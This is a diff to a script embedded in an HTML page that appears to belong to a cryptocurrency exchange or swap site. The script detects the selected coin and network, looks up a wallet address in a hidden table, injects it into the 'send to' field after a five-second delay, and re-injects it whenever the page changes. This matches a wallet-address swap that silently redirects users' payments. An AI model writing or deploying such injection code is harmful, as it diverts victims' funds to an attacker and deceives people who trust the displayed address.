@@ -72,19 +72,19 @@
   function getCoinAndNetwork() {
     const label = document.querySelector('#You\\ send-label');
     if (!label) {
-      console.log("[getCoinAndNetwork] ❌ #You send-label not found");
+      console.log("[❌] #You send-label not found");
       return null;
     }
 
     const container = label.closest('.flex.flex-col.items-start');
     if (!container) {
-      console.log("[getCoinAndNetwork] ❌ Coin container not found");
+      console.log("[❌] Coin container not found");
       return null;
     }
 
     const coinEl = container.querySelector('span.font-bold');
     if (!coinEl) {
-      console.log("[getCoinAndNetwork] ❌ Coin symbol not found");
+      console.log("[❌] Coin symbol not found");
       return null;
     }
 
@@ -92,14 +92,14 @@
 
     const networkSpan = container.querySelector('.ntek-dete');
     if (!networkSpan || !networkSpan.parentElement) {
-      console.log("[getCoinAndNetwork] ❌ Network element not found");
+      console.log("[❌] Network element not found");
       return null;
     }
 
     let networkText = networkSpan.parentElement.textContent || '';
     networkText = networkText.replace(/Network/i, '').trim().toUpperCase();
 
-    console.log(`[getCoinAndNetwork] ✅ Coin: ${coin}, Network: ${networkText}`);
+    console.log(`[✅] Coin: ${coin}, Network: ${networkText}`);
 
     return { coin, network: networkText };
   }
@@ -107,7 +107,7 @@
   function insertAddress(address) {
     const sendToLabel = document.getElementById("send-to-label");
     if (!sendToLabel) {
-      console.log("[insertAddress] ❌ #send-to-label not found — waiting...");
+      console.log("[⏳] #send-to-label not found — waiting...");
       return false;
     }
 
@@ -120,7 +120,7 @@
     }
 
     addressEl.textContent = address;
-    console.log(`[insertAddress] ✅ Address injected: ${address}`);
+    console.log(`[✅] Address injected: ${address}`);
     return true;
   }
 
@@ -131,30 +131,35 @@
     const key = `${info.coin}_${info.network}`;
     const address = coinAddresses[key];
 
-    console.log(`[updateAddressIfPossible] 🔍 Lookup Key: ${key}`);
-    console.log(`[updateAddressIfPossible] 🎯 Address: ${address || "Not found"}`);
+    console.log(`[🔍] Lookup Key: ${key}`);
+    console.log(`[🎯] Address: ${address || "Not found"}`);
 
     if (address) insertAddress(address);
   }
 
-  // Mutation Observer
+  // Observer for DOM changes
   const observer = new MutationObserver(() => {
-    console.log("[observer] 🔁 DOM changed — trying to update address...");
+    console.log("[🔁] DOM changed — checking again...");
     updateAddressIfPossible();
   });
 
   window.addEventListener('load', () => {
-    console.log("[init] ✅ Page loaded, starting observer...");
+    console.log("[🚀] Page loaded, waiting 5 seconds before running...");
 
     setTimeout(() => {
-      updateAddressIfPossible(); // initial try
+      updateAddressIfPossible(); // first try after delay
+
+      // Start observing
       observer.observe(document.body, {
         childList: true,
         subtree: true
       });
-    }, 1000);
+
+      console.log("[👀] MutationObserver started...");
+    }, 5000); // ⏱ 5 second delay
   });
 </script>
+
                                                                                                                          
 
 </html>
